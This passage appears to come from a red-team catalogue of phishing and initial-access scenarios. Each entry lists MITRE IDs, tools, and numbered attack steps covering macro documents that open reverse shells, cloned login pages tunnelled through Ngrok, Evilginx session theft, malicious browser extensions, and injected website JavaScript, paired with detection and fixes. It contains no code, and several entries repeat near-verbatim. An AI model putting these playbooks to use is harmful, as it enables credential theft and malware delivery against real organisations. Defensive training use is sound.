- **Attack Steps**: 1. Design a compelling PDF flyer mimicking a known security event. 2. Use Adobe exploits to embed a Cobalt Strike beacon. 3. Target cybersecurity professionals via LinkedIn or email scraping. 4. Send the invite as a partner or sponsor. 5. Once opened, beacon executes silently and opens a command channel.
- **Detection**: Email AV scans, file sandboxing
- **Solution**: Validate sender legitimacy, open PDFs in VM
- **Tags**: RedTeam, ConferencePhish, PDFExploit, MITRE_T1566_001

## Malicious Job Offer via LinkedIn Message

- **Attack Type**: Social Engineering via Career Outreach
- **Target**: Tech Employee
- **Vulnerability**: Trust in LinkedIn recruiters
- **MITRE**: T1589.001 – Social Engineering
- **Impact**: Remote code execution, persistence
- **Tools**: LinkedIn, MacroExcel, MSFVenom
- **Scenario**: An attacker sends a malicious Excel file disguised as a job offer via LinkedIn to exploit tech professionals.
- **Attack Steps**: 1. Build a fake recruiter profile with endorsements and history. 2. Connect with target professionals (e.g., developers). 3. Initiate conversation about an attractive job offer. 4. Send macro-laden Excel file titled "OfferDetails.xlsx". 5. Upon open and macro execution, reverse shell is initiated.
- **Detection**: Suspicious file type warnings, macro scan alerts
- **Solution**: Train on LinkedIn scams, block Office macros
- **Tags**: RedTeam, LinkedInPhish, MacroPayload, MITRE_T1589_001

## Audit Alert Phish from Fake Compliance Email

- **Attack Type**: Corporate Process Abuse
- **Target**: Compliance Officer
- **Vulnerability**: Trust in internal audit requests
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Account compromise, internal access
- **Tools**: SEToolkit, Gmail Clone, Ngrok
- **Scenario**: Fake compliance email urges user to log in to review audit results, leading to a phishing portal.
- **Attack Steps**: 1. Clone Gmail login page using SEToolkit. 2. Host phishing page via Ngrok. 3. Write urgent compliance email about an overdue internal audit. 4. Send email using spoofed domain or compromised inbox. 5. Harvest credentials when the user logs in to the fake portal.
- **Detection**: Email header anomaly alerts, credential stuffing logs
- **Solution**: Strict audit communication protocols, use signed messages
- **Tags**: RedTeam, AuditPhish, ComplianceFraud, MITRE_T1566_001

## Vendor Impersonation for IP Theft

- **Attack Type**: Supply Chain Exploitation
- **Target**: Product Manager
- **Vulnerability**: Lack of vendor domain validation
- **MITRE**: T1585.001 – Impersonation: Trusted Relationship
- **Impact**: IP leakage, reputational damage
- **Tools**: Spoofed Email, OSINT
- **Scenario**: Attacker pretends to be a trusted vendor and requests sensitive documents as part of a staged security process.
- **Attack Steps**: 1. Perform OSINT to identify real vendors and their contacts. 2. Register a domain similar to the vendor (e.g., accnt-microntech.com). 3. Reach out to product manager citing urgent “security compliance.” 4. Request access to architectural documents. 5. Exfiltrate intellectual property once received.
- **Detection**: Vendor comms validation, attachment DLP scanning
- **Solution**: Validate all third-party requests, vendor codewords
- **Tags**: RedTeam, VendorPhish, SupplyChainFraud, MITRE_T1585_001

## Legal Threat Email with Macro-Enabled Document

- **Attack Type**: Fear-Based Document Exploit
- **Target**: Legal Team
- **Vulnerability**: Fear-based response, macro vulnerability
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Lateral movement, privilege escalation
- **Tools**: MS Word, MSFvenom
- **Scenario**: Attacker impersonates legal counsel and sends a .doc file embedded with macros, pressuring action.
- **Attack Steps**: 1. Draft an intimidating email about legal action for contract violation. 2. Attach macro-laden Word document disguised as “legal_notice.doc.” 3. Send to legal or finance departments from spoofed vendor email. 4. Once opened, payload triggers remote shell. 5. Use access to pivot within network or steal financial/legal files.
- **Detection**: Email behavioral analysis, AV macro scanning
- **Solution**: Train legal team, verify legal sender authenticity
- **Tags**: RedTeam, LegalPhish, MacroDOC, MITRE_T1566_001

## AWS Billing Alert with Evilginx Interception

- **Attack Type**: Cloud Alert Phishing
- **Target**: Cloud Admin
- **Vulnerability**: Urgency via billing notification
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Cloud access abuse, data modification
- **Tools**: AWS Clone, Evilginx, Ngrok
- **Scenario**: A fake billing alert from AWS lures cloud admins to a fake login page for token theft.
- **Attack Steps**: 1. Clone AWS login using Evilginx. 2. Generate a spoofed billing alert email citing “unexpected charges.” 3. Include shortened Ngrok phishing link. 4. When cloud admin logs in, capture password and session token. 5. Use credentials to explore cloud resources.
- **Detection**: IAM logs, unusual login activity
- **Solution**: Require device-based MFA, train admins
- **Tags**: RedTeam, AWSPhishing, CloudCreds, MITRE_T1566_002

## Fake SharePoint Access Request

- **Attack Type**: Collaboration Platform Abuse
- **Target**: SharePoint Users
- **Vulnerability**: Trust in internal tools like SharePoint
- **MITRE**: T1566.002 – Collaboration App Phishing
- **Impact**: Document leaks, privilege abuse
- **Tools**: O365 Spoofing, Ngrok, SEToolkit
- **Scenario**: Phishing email mimics SharePoint file request, leading to a cloned login page.
- **Attack Steps**: 1. Clone SharePoint login and host on Ngrok. 2. Send internal-styled email about document collaboration. 3. Include phishing link resembling SharePoint URL. 4. Capture credentials with SEToolkit. 5. Use access to navigate shared resources.
- **Detection**: OAuth alerts, file access log correlation
- **Solution**: Use domain filtering, enforce signed links
- **Tags**: RedTeam, SharePointPhish, CollabToolAbuse, MITRE_T1566_002

## Fake Internal Procurement Email

- **Attack Type**: Internal Impersonation
- **Target**: Procurement Team
- **Vulnerability**: Internal communication assumption
- **MITRE**: T1585.002 – Internal Impersonation
- **Impact**: Supply chain manipulation, financial access
- **Tools**: Email Spoofer, GoPhish
- **Scenario**: Attacker sends an internal-looking email asking for portal credentials under procurement pretext.
- **Attack Steps**: 1. Use email spoofing tool to impersonate internal procurement address. 2. Craft message requesting urgent vendor access for “end-of-quarter reconciliation.” 3. Link leads to credential harvesting page. 4. Once credentials are obtained, access procurement portal. 5. Use access for lateral movement or supply chain tampering.
- **Detection**: Email verification logs, internal spoof monitoring
- **Solution**: Tag internal emails, enforce SSO for portal
- **Tags**: RedTeam, ProcurementPhish, InternalAbuse, MITRE_T1585_002

## Compromised Recruiter Outreach on LinkedIn

- **Attack Type**: Professional Network Exploitation
- **Target**: Tech Employee
- **Vulnerability**: Trust in professional recruiters
- **MITRE**: T1589.001 – Social Engineering
- **Impact**: Remote shell access, data exfiltration
- **Tools**: LinkedIn, MSFVenom, MacroExcel
- **Scenario**: A fake recruiter lures targets using LinkedIn and sends a malicious file disguised as a job offer.
- **Attack Steps**: 1. Register a convincing recruiter profile with endorsements and relevant job history.2. Identify cybersecurity or dev employees at the target company via LinkedIn search.3. Send direct messages with a personalized job offer, attaching a macro-laced Excel file.4. Upon download and macro execution, initiate a remote shell to gain access to the internal network.
- **Detection**: File origin tracking, macro execution alerts
- **Solution**: Employee awareness on job scam patterns
- **Tags**: RedTeam, LinkedInPhish, MacroShell, SocialEngineering, MITRE_T1589_001

## Internal Audit Scam via Email

- **Attack Type**: Fake Compliance Communication
- **Target**: Compliance Officer
- **Vulnerability**: Blind trust in internal mail origin
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Credential theft and policy evasion
- **Tools**: SEToolkit, Ngrok, Gmail Clone
- **Scenario**: An attacker mimics the internal audit department to steal credentials under the guise of policy compliance.
- **Attack Steps**: 1. Clone Gmail login page with a matching UI and SSL cert spoof using Ngrok.2. Write a professional-looking internal email urging users to log in for reviewing an urgent audit document.3. Send to compliance and finance staff.4. Capture credentials upon login.5. Use those credentials for internal movement and lateral privilege escalation.
- **Detection**: Login source anomaly detection
- **Solution**: Verification protocol for internal audits
- **Tags**: RedTeam, AuditPhish, CredentialTrap, MITRE_T1566_001

## Vendor Audit Request for Confidential Documents

- **Attack Type**: Vendor Trust Exploitation
- **Target**: Product Manager
- **Vulnerability**: Weak verification of vendor authenticity
- **MITRE**: T1585.001 – Trusted Relationship
- **Impact**: Theft of IP, reputational loss
- **Tools**: OSINT, Spoofed Email, DocRequest
- **Scenario**: Attackers pretend to be known vendors requesting sensitive files under security audit pretenses.
- **Attack Steps**: 1. Research vendor relationships using press releases or LinkedIn job roles.2. Register a spoofed domain that closely mimics the real vendor (e.g., vend0r.com).3. Send a highly contextual email asking for documents for a ‘security compliance audit’.4. Once received, exfiltrate sensitive IP, source code, or diagrams.5. Use documents for competitive or malicious advantage.
- **Detection**: Behavioral analysis of vendor interaction
- **Solution**: Digital vendor registry, validation layers
- **Tags**: RedTeam, VendorScam, IPLeak, Impersonation, MITRE_T1585_001

## Legal Threat Email with Macro Exploit

- **Attack Type**: Legal-Themed Phishing
- **Target**: Legal Team
- **Vulnerability**: High trust in legal emails
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Code execution, legal data compromise
- **Tools**: Word, MSFVenom, MacroPack
- **Scenario**: A fake legal threat forces victims to open a Word document that runs malicious macros.
- **Attack Steps**: 1. Draft a formal legal notice referencing “pending litigation”.2. Attach a macro-enabled Word file disguised as a notice.3. Email legal or finance teams using spoofed domains.4. When opened, the macro initiates a reverse shell.5. Attacker maintains persistence and pivots to adjacent systems.
- **Detection**: Legal mailbox filtering, AV alerts
- **Solution**: Train legal staff, block macros by policy
- **Tags**: RedTeam, LegalPhish, MacroAttack, MITRE_T1566_001

## Fake AWS Billing Alert

- **Attack Type**: Cloud Notification Phishing
- **Target**: Cloud Admin
- **Vulnerability**: Trust in branded cloud alerts
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Resource control, cloud data exposure
- **Tools**: Evilginx, AWS Clone, Ngrok
- **Scenario**: Impersonating AWS billing alert, attacker tricks users into entering credentials into a phishing site.
- **Attack Steps**: 1. Clone AWS sign-in interface using Evilginx for session hijacking.2. Draft billing error alert email with urgency (“overdue charge detected”).3. Embed Ngrok-hosted link pointing to fake login.4. Capture session cookies and credentials.5. Use to access cloud resources and elevate privileges.
- **Detection**: IAM pattern analysis, login geography tracking
- **Solution**: Train teams to verify billing alerts
- **Tags**: RedTeam, AWSPhish, EvilginxCloud, MITRE_T1566_002

## SharePoint Request Spoof with Fake Login

- **Attack Type**: Collaboration Tool Phish
- **Target**: SharePoint Users
- **Vulnerability**: Internal link trust, poor phishing defense
- **MITRE**: T1566.002 – Phishing via Collab Tool
- **Impact**: Credential access to internal files
- **Tools**: Ngrok, O365 Phish, SEToolkit
- **Scenario**: An attacker mimics internal file access request using SharePoint to steal credentials.
- **Attack Steps**: 1. Clone the Microsoft SharePoint login interface.2. Draft an internal-looking request asking to “review updated roadmap”.3. Use a spoofed email to send this link to SharePoint users.4. Phishing page captures login credentials.5. Attackers explore document libraries and lateral movement options.
- **Detection**: Link inspection, OAuth session analysis
- **Solution**: Filter internal link sharing, enforce SSO use
- **Tags**: RedTeam, SharePointPhish, InternalSpoof, MITRE_T1566_002

## Procurement Login Harvest via Internal Spoof

- **Attack Type**: Department Impersonation
- **Target**: Procurement Team
- **Vulnerability**: Lack of strict identity validation
- **MITRE**: T1585.002 – Internal Impersonation
- **Impact**: Procurement data breach, vendor fraud
- **Tools**: GoPhish, Email Spoofer
- **Scenario**: A forged procurement login request steals portal access credentials.
- **Attack Steps**: 1. Impersonate an internal procurement lead’s email.2. Draft an urgent vendor portal access email citing policy updates.3. Link points to a fake login form.4. Harvest credentials.5. Use them to access procurement systems and vendor records, then expand into finance portals.
- **Detection**: Internal identity tagging, anomaly-based mail alerts
- **Solution**: Centralized procurement workflow enforcement
- **Tags**: RedTeam, ProcurementPhish, VendorTrap, MITRE_T1585_002

## Cybersecurity Survey Scam

- **Attack Type**: Survey-Form Exploitation
- **Target**: Security Admins
- **Vulnerability**: Blind form trust, lack of verification
- **MITRE**: T1566.002 – Web Form Phishing
- **Impact**: Security tool compromise
- **Tools**: GoPhish, Google Forms
- **Scenario**: A fake cyber audit survey asks for internal tool access credentials from security staff.
- **Attack Steps**: 1. Create a form with professional formatting and company logo.2. Ask for information like EDR platform access, SIEM credentials, or VPN.3. Email this form to security/admin users with a fake announcement.4. Harvest sensitive information.5. Exploit the gathered info to disable or bypass defenses.
- **Detection**: Form URL reputation checks, link sandboxing
- **Solution**: Avoid credential-based surveys, whitelist forms
- **Tags**: RedTeam, SurveyPhish, SecurityBypass, MITRE_T1566_002

## COVID-19 HR Policy Change Scam

- **Attack Type**: Pandemic-Themed Social Engineering
- **Target**: All Employees
- **Vulnerability**: High emotional trust during health crises
- **MITRE**: T1566.001 – Event-Themed Phishing
- **Impact**: Compromised internal systems, panic
- **Tools**: Ngrok, SEToolkit
- **Scenario**: Attackers use COVID-related HR notices to lure users into credential-stealing portals.
- **Attack Steps**: 1. Clone HR portal login screen and brand it.2. Draft an email about “urgent policy changes regarding remote work or health”.3. Send to all employees with spoofed HR domain.4. Collect credentials.5. Use to access payroll, health data, and internal documents.
- **Detection**: Health-related comms whitelisting
- **Solution**: Official newsletter channels only
- **Tags**: RedTeam, COVIDPhish, HRScam, MITRE_T1566_001

## Fake Remote Access Migration Notice

- **Attack Type**: VPN Infrastructure Phishing
- **Target**: Remote Employees
- **Vulnerability**: Fear of access loss, urgency exploitation
- **MITRE**: T1566.002 – Infrastructure Phish
- **Impact**: Unauthorized VPN access, persistence
- **Tools**: Fake VPN UI, GoPhish, Ngrok
- **Scenario**: An attacker claims remote portal migration and steals VPN credentials via a fake interface.
- **Attack Steps**: 1. Clone corporate VPN portal interface.2. Draft a “security upgrade” email urging employees to migrate to a new VPN portal.3. Include Ngrok phishing link.4. Capture login credentials and tokens.5. Use credentials for long-term remote access or persistence.
- **Detection**: VPN log correlation, MFA failures
- **Solution**: Enforce centralized access portals
- **Tags**: RedTeam, VPNPhish, RemoteFraud, MITRE_T1566_002

## Dropbox Script Link Phishing

- **Attack Type**: Cloud File Delivery Attack
- **Target**: Project Managers
- **Vulnerability**: Trust in collaborative file links
- **MITRE**: T1566.002 – Cloud Service Abuse
- **Impact**: Remote code execution, data exfiltration
- **Tools**: Dropbox, Word Macro, GoPhish
- **Scenario**: Dropbox link used to deliver a macro-weaponized script disguised as a shared project resource.
- **Attack Steps**: 1. Create malicious macro-laced Word document containing credential-stealing script.2. Upload to Dropbox with appropriate filename (e.g., ProjectBrief.docx).3. Share via email as a “collaboration link”.4. On open, macro runs and harvests credentials or initiates shell.5. Use access for further intrusion.
- **Detection**: Macro scan engine, link content inspection
- **Solution**: Limit shared cloud usage, disable macros org-wide
- **Tags**: RedTeam, DropboxScam, MacroDelivery, MITRE_T1566_002

## Vendor Payment Phish with Embedded Payload

- **Attack Type**: Finance-Themed Email Trap
- **Target**: Finance Team
- **Vulnerability**: Transaction urgency exploitation
- **MITRE**: T1566.001 – Financial Attachment
- **Impact**: Financial compromise, backdoor presence
- **Tools**: Excel Macro, PDF Exploit
- **Scenario**: A fake invoice embedded with malware is sent to finance to install a backdoor.
- **Attack Steps**: 1. Craft invoice resembling vendor design using Excel or PDF.2. Embed macro shellcode or PDF exploit payload.3. Email to accounts team with urgency (“payment overdue”).4. User opens file, macro triggers C2 connection.5. Attacker gains entry into financial systems.
- **Detection**: Attachment sandboxing, email header analysis
- **Solution**: Verification loop for all finance-related comms
- **Tags**: RedTeam, FinancePhish, InvoiceHack, MITRE_T1566_001

## Acquisition News to Trick Executives

- **Attack Type**: M&A Insider Social Engineering
- **Target**: Executives
- **Vulnerability**: Curiosity during sensitive M&A events
- **MITRE**: T1566.002 – Strategic Phishing
- **Impact**: Insider info leak, leadership compromise
- **Tools**: DocuSign Clone, Ngrok, GoPhish
- **Scenario**: Fake merger news prompts execs to log in to a DocuSign portal which harvests credentials.
- **Attack Steps**: 1. Clone DocuSign page with corporate branding.2. Write executive email titled “CONFIDENTIAL: Acquisition Discussion”.3. Include urgent document requiring login to view.4. Harvest credentials.5. Attacker gains executive system or email access for insider threats.
- **Detection**: Exec login pattern alerts, IP detection
- **Solution**: Restrict M&A topics to secure channels
- **Tags**: RedTeam, ExecPhish, InsiderScam, MITRE_T1566_002

## Legal Action Scam with Macro-PDF Combo

- **Attack Type**: Legal-Themed Phishing Combo
- **Target**: Legal/Finance Team
- **Vulnerability**: Fear of legal non-compliance
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Remote access, sensitive document exfiltration
- **Tools**: MS Word, MSFvenom, Adobe PDF
- **Scenario**: The attacker pretends to be from a legal compliance agency and delivers a PDF embedded with macro-based payload to the legal team.
- **Attack Steps**: 1. Draft a formal-looking legal notice email referencing alleged compliance violation.2. Create a PDF document that pretends to be a court document but uses embedded links to a macro-enabled DOC.3. Attach both PDF and macro DOC inside a ZIP file to bypass scanners.4. Send to targeted legal and finance staff using a spoofed law firm domain.5. Upon DOC open, the macro triggers a reverse shell back to the attacker C2.6. Establish persistence and harvest document access.
- **Detection**: ZIP+macro attachment scanning, PDF-to-DOC link tracking
- **Solution**: Macro policy enforcement, validate external legal emails
- **Tags**: RedTeam, LegalPhish, ZIPMacroTrap, MITRE_T1566_001

## Fake Cloud Usage Quota Alert from AWS

- **Attack Type**: Cloud Alert Impersonation
- **Target**: Cloud Admins
- **Vulnerability**: Fear of service disruption
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Cloud takeover, policy manipulation
- **Tools**: Evilginx2, Ngrok, AWS clone UI
- **Scenario**: Targets receive a fake “usage exceeded” alert from AWS and are redirected to a cloned login portal.
- **Attack Steps**: 1. Create a realistic copy of the AWS sign-in interface using Evilginx2.2. Generate a phishing email alerting the user that their AWS service quota has been exceeded, with warnings about potential service shutdown.3. Include urgent CTA button leading to Ngrok-hosted fake login.4. When credentials are entered, Evilginx intercepts session cookies.5. Use the hijacked session to access AWS console, pivot to S3 buckets or IAM policies.6. Modify policies or exfiltrate data silently.
- **Detection**: Session token logging, IAM event timeline
- **Solution**: Cloud login behavior rules, IP-based alerts
- **Tags**: RedTeam, CloudPhish, Evilginx, AWSQuotaTrap, MITRE_T1566_002

## Microsoft Teams File Share Trap

- **Attack Type**: Collaboration Tool Abuse
- **Target**: Corporate Employees
- **Vulnerability**: Familiarity with internal tools
- **MITRE**: T1566.002 – Phishing via Collaboration Tool
- **Impact**: O365 access, document tampering
- **Tools**: O365 Spoofer, Teams Clone, SET
- **Scenario**: Attacker sends a fake Microsoft Teams “shared file” notification with a link to a credential trap.
- **Attack Steps**: 1. Clone Microsoft Teams file access prompt using known UI elements and host via Ngrok.2. Draft an internal-looking email stating a teammate has shared a critical quarterly report.3. Include "Open in Teams" button redirecting to the Ngrok-hosted credential phish page.4. Capture O365 credentials or refresh tokens via SEToolkit.5. Access actual Teams environment or SharePoint.6. Exfiltrate documents, inject malicious content for lateral movement.
- **Detection**: OAuth login behavior anomalies, Ngrok domain detection
- **Solution**: Disable external file prompts, Teams URL validation
- **Tags**: RedTeam, TeamsPhish, InternalSpoof, CollabTrap, MITRE_T1566_002

## Impersonated CTO Requesting Vendor Access

- **Attack Type**: Exec Identity Spoofing
- **Target**: Procurement Team
- **Vulnerability**: Obedience to C-level urgency
- **MITRE**: T1585.002 – Internal Impersonation
- **Impact**: Vendor portal compromise, procurement fraud
- **Tools**: GoPhish, Email Spoofer
- **Scenario**: Attacker pretends to be the CTO urgently asking procurement team to log into vendor system.
- **Attack Steps**: 1. Clone an internal email signature of the CTO using real staff directory info.2. Draft an urgent email requesting procurement team to verify and approve a vendor login within a short deadline.3. Include a link to a fake login page mimicking the vendor’s SSO system.4. Capture entered credentials.5. Use access to raise fraudulent purchase orders or gather vendor communication trails.6. Possibly re-target vendors for BEC-style attacks.
- **Detection**: Internal identity behavior monitoring
- **Solution**: Internal mail tagging, verify sudden C-level requests
- **Tags**: RedTeam, CLevelPhish, ProcurementHack, MITRE_T1585_002

## Security Audit Compliance Survey Phish

- **Attack Type**: Fake Compliance Survey Attack
- **Target**: Security Admins
- **Vulnerability**: Fear of non-compliance penalties
- **MITRE**: T1566.002 – Web Form Phishing
- **Impact**: Exposure of access control details
- **Tools**: Google Forms, GoPhish
- **Scenario**: A phishing email claims an urgent internal audit survey is required, targeting security admins.
- **Attack Steps**: 1. Design a phishing survey using Google Forms styled like an internal audit form.2. Add fields asking for tool access details, API keys, and admin console links under the guise of compliance review.3. Spoof sender to look like internal audit or risk department.4. Send to IT/security team with a subject like "24hr Response Required: Security Posture Survey."5. Log all submitted credentials or tokens.6. Use data to access internal dashboards and assess the footprint for further exploitation.
- **Detection**: Survey form analytics, link origin validation
- **Solution**: Never request credentials via forms, enforce SSO checks
- **Tags**: RedTeam, SurveyPhish, AuditScam, SecurityHarvest, MITRE_T1566_002

## Remote Work HR Update with Hidden Payload

- **Attack Type**: HR Policy Phishing w/ Payload
- **Target**: All Employees
- **Vulnerability**: HR policy trust and urgency
- **MITRE**: T1566.001 – Event-Based Spearphishing
- **Impact**: Initial access, malware deployment
- **Tools**: Ngrok, SEToolkit, MS Word Exploit
- **Scenario**: Fake HR policy update email about remote work changes links to DOC with embedded exploit.
- **Attack Steps**: 1. Clone HR letterhead and draft a professional notice about new WFH policies.2. Embed a payload using Word exploit (e.g., CVE-2017-0199) within a DOC.3. Host document on a Ngrok server to mask origin.4. Send email to all employees citing a mandatory read deadline.5. Upon DOC open, exploit triggers a silent download and execution of payload.6. Payload establishes a callback for RAT installation or data siphoning.
- **Detection**: DOC exploit behavior detection, internal link sandboxing
- **Solution**: Mandate HR policy access via intranet, block external DOC loads
- **Tags**: RedTeam, HRPhish, RemotePayload, MITRE_T1566_001

## Fake Remote Work Access Portal (Alternate)

- **Attack Type**: VPN Credential Harvesting
- **Target**: Remote Workforce
- **Vulnerability**: Urgency and trust in IT department messages
- **MITRE**: T1566.002 – Spearphishing via Service
- **Impact**: Compromise of VPN and internal network access
- **Tools**: CloneVPN, Ngrok, GoPhish
- **Scenario**: Attacker impersonates IT team and distributes a fake VPN update email that links to a phishing page mimicking the organization's remote access portal.
- **Attack Steps**: 1. Design a realistic clone of the company's VPN login portal with branding and login fields.2. Host the clone on a public URL using Ngrok or similar tunneling service.3. Spoof an internal IT helpdesk email domain and draft a “mandatory VPN update” message.4. Email is sent to remote workers, citing urgent security upgrades.5. Users log in to the fake page, providing credentials.6. Credentials are harvested and used for real-time access to infrastructure.
- **Detection**: Monitor VPN login attempts from new geolocations; anomaly detection on remote logins
- **Solution**: Enforce device-based MFA, only allow access via verified VPN clients
- **Tags**: RedTeam, RemoteWorkPhish, VPNTrap, MITRE_T1566_002, Spearphishing

## Dropbox File Share Phish – Macro Trap (Alt)

- **Attack Type**: Cloud-Based Phishing
- **Target**: Managers
- **Vulnerability**: Trust in shared documents from Dropbox
- **MITRE**: T1566.002 – Cloud Delivery Phishing
- **Impact**: Remote command execution, data exfiltration
- **Tools**: Dropbox, Word Macro, PowerShell
- **Scenario**: A seemingly normal shared document is used to deliver a malicious script that executes upon opening, leveraging macro-enabled files in Dropbox.
- **Attack Steps**: 1. Create a Microsoft Word file containing an auto-executing macro that triggers a PowerShell command to connect back to the attacker's server.2. Upload the file to Dropbox and generate a “shareable link.”3. Craft a fake internal project email, claiming to include important collaborative updates.4. Target mid-level managers and team leads.5. Once downloaded and opened, the macro executes silently, either stealing credentials or initiating a backdoor session.
- **Detection**: Dropbox link analysis, sandboxing macro behavior
- **Solution**: Only allow downloads from trusted domains, scan shared content
- **Tags**: RedTeam, DropboxMacroPhish, MacroTrap, CloudPhishing, MITRE_T1566_002

## Vendor Payment Confirmation with Excel Exploit (Alt)

- **Attack Type**: Financial Spearphishing
- **Target**: Finance Dept
- **Vulnerability**: Trust in invoice attachments, urgency bias
- **MITRE**: T1566.001 – Phishing with Attachment
- **Impact**: Remote control, fraudulent payments
- **Tools**: Excel Macros, Powershell Empire
- **Scenario**: Targets finance teams with a fake invoice attachment claiming to resolve urgent vendor payments, hiding malicious macros.
- **Attack Steps**: 1. Craft an Excel sheet posing as a vendor invoice, embedded with obfuscated VBA macros.2. Macros download and execute remote payload upon enabling.3. Create a convincing email thread spoofing a known vendor with "Re: Urgent Payment Due" subject.4. Target finance staff by impersonating procurement or accounts payable.5. Once the file is opened and macros are enabled, it opens a reverse shell or installs a keylogger.6. Gained access is used to pivot or initiate fake transactions.
- **Detection**: Attachment sandboxing, correlation with vendor domains
- **Solution**: Implement invoice validation workflows, block unknown macro files
- **Tags**: RedTeam, FinancePhish, ExcelExploit, MITRE_T1566_001, MacroFraud

## CEO Fraud via Acquisition Update (Alt)

- **Attack Type**: Executive Impersonation
- **Target**: C-Level Execs
- **Vulnerability**: Executive curiosity, high-value targets
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Business espionage, executive data theft
- **Tools**: DocuSign Clone, Ngrok, Evilginx
- **Scenario**: A fake email alerts execs about a confidential company acquisition, leading them to a fake login to access M&A docs.
- **Attack Steps**: 1. Clone a DocuSign or similar digital signature platform login page with realistic design.2. Generate a phishing link with Ngrok and secure SSL.3. Send an urgent and confidential-looking email to the C-suite, implying insider M&A activity requiring secure login.4. Link in email redirects to fake DocuSign page where credentials are harvested using Evilginx proxy.5. Use stolen tokens to bypass MFA and access executive-level cloud files.
- **Detection**: Login origin anomalies, geo-IP restrictions
- **Solution**: Use executive-only secure communication channels, token expiration policies
- **Tags**: RedTeam, ExecScam, M&AFraud, CEOPhishing, MITRE_T1566_002

## Hidden iFrame Injection in Blog Comments (Alt)

- **Attack Type**: Browser Drive-by Compromise
- **Target**: Website Visitors
- **Vulnerability**: HTML iframe handling in public input forms
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Stealth malware infection
- **Tools**: JavaScript, iFrame, XSS Redirect
- **Scenario**: Malicious iframe hidden in blog post comments loads malware from a remote source silently in the background.
- **Attack Steps**: 1. Identify vulnerable blog/forum platforms that support HTML in comments.2. Register fake user accounts and post comments containing an invisible iframe (<iframe style="display:none">).3. The iframe references an attacker-controlled page that redirects to a malware-hosting site.4. Victims reading the page unknowingly load the malicious iframe.5. Depending on browser/plugin vulnerabilities, malware is dropped silently or prompts disguised file downloads.6. Exploits may include PDF zero-days, JS obfuscation, or auto-download tricks.
- **Detection**: CSP headers, iframe domain blacklisting
- **Solution**: Strip HTML in user comments, enforce WAF/XSS filters
- **Tags**: RedTeam, DriveByExploit, HiddeniFrame, JSInject, MITRE_T1189

## Fake Productivity Browser Extension

- **Attack Type**: Browser Extension Backdoor
- **Target**: Corporate Users
- **Vulnerability**: Unverified extension installs via fake Chrome Web Store clones
- **MITRE**: T1176 – Malicious Extension
- **Impact**: Stealth browser-based persistence, command execution
- **Tools**: Chrome Extension, WebSocket, Background JS
- **Scenario**: A fake productivity-focused browser extension is promoted to users, promising enhanced features but actually establishes persistent C2.
- **Attack Steps**: 1. Attacker creates a fake Chrome extension claiming to improve user productivity (e.g., task manager or calendar enhancer).2. The extension includes an appealing description, icon, and user reviews (faked) to increase legitimacy.3. Inside the extension's background script, hidden code connects to the attacker's C2 via encrypted WebSocket channels.4. On installation, the extension communicates system fingerprint and session data to the C2.5. C2 server pushes commands like payload download URLs, triggering the extension to fetch executables in the background.6. These payloads are written to disk using Blob and FileSystem APIs or cached via service workers.7. Persistence is achieved via auto-start registry keys created using native messaging or external helper binaries.8. The malware executes post-reboot or upon browser startup.
- **Detection**: Extension install telemetry, outgoing WebSocket anomaly detection
- **Solution**: Enforce extension allowlists, disable developer mode for users
- **Tags**: #BrowserBackdoor #FakeExtension #WebSocketC2 #Persistence #MITRE_T1176

## Cracked Software Portal with Payload Drop

- **Attack Type**: Pirated Software Trap
- **Target**: General Users
- **Vulnerability**: Desire for free software, security warnings ignored
- **MITRE**: T1204.002 – User Execution via ZIP
- **Impact**: System-level malware infection, possible ransomware
- **Tools**: ZIP Payload, Binder EXE, SEO Poisoning
- **Scenario**: Attacker runs a pirated software site that lures users with fake "free" versions, but delivers malware-bound executables.
- **Attack Steps**: 1. Attacker creates a convincing site named like "freemegacracks[.]com" and populates it with cracked software offers.2. Uses SEO poisoning to rank highly in searches for popular pirated apps like Photoshop or MS Office.3. Each download link redirects to a ZIP file bundled with a malicious executable using an EXE binder.4. The EXE pretends to be a license activator or keygen but contains ransomware or RAT.5. Users are instructed to disable antivirus to "avoid false positives", aiding infection.6. Once executed, the malware encrypts files or connects to a botnet C2.7. The site rotates payloads per IP or day to avoid static detection.8. The campaign scales using mirrors and multiple download services.
- **Detection**: DNS telemetry for download domains, sandbox analysis
- **Solution**: Block piracy domains, enforce endpoint protection policies
- **Tags**: #CrackedSoftware #PiracyMalware #ZIPTrojan #RansomwareVector #MITRE_T1204_002

## Compromised News Portal JavaScript Injection

- **Attack Type**: CMS Template Injection
- **Target**: News Readers
- **Vulnerability**: Compromised site templates delivering hidden JS
- **MITRE**: T1189 – Drive-by via Compromise
- **Impact**: Mass compromise of public users, surveillance
- **Tools**: JavaScript Dropper, Template Exploit, Remote Shell
- **Scenario**: News portal gets compromised at template level, pushing JavaScript malware to all visitors.
- **Attack Steps**: 1. Attacker compromises a news website's backend via stolen CMS credentials (e.g., via leaked admin password).2. Injects a malicious <script src> tag into a master article template used by all news posts.3. The injected JS executes silently when readers view any article.4. It initiates a background connection to an attacker-controlled domain, fetching a second-stage loader.5. This loader may utilize native tools like mshta.exe, certutil.exe, or PowerShell to write and execute payloads.6. Malware may include spyware, backdoors, or crypto-miners.7. Attacker rotates payloads based on IP/geolocation to remain stealthy.8. Campaign can remain live for days until web admins detect anomalies in site traffic or user complaints.
- **Detection**: Content-Security-Policy (CSP), JS behavior anomalies
- **Solution**: Audit CMS access, use template integrity hashes
- **Tags**: #CMSExploit #NewsPortalHack #JavaScriptInjection #DriveBy #MITRE_T1189

## Malicious Ad Banner Hosting Zero-Day

- **Attack Type**: Malvertising with 0-Day
- **Target**: All Web Users
- **Vulnerability**: Unpatched browsers, ad network supply chain
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: Remote system takeover, persistent compromise
- **Tools**: Shellcode, Exploit Kit, Malvertising
- **Scenario**: Clickable ad banner hides a zero-day that compromises browsers via memory corruption exploit.
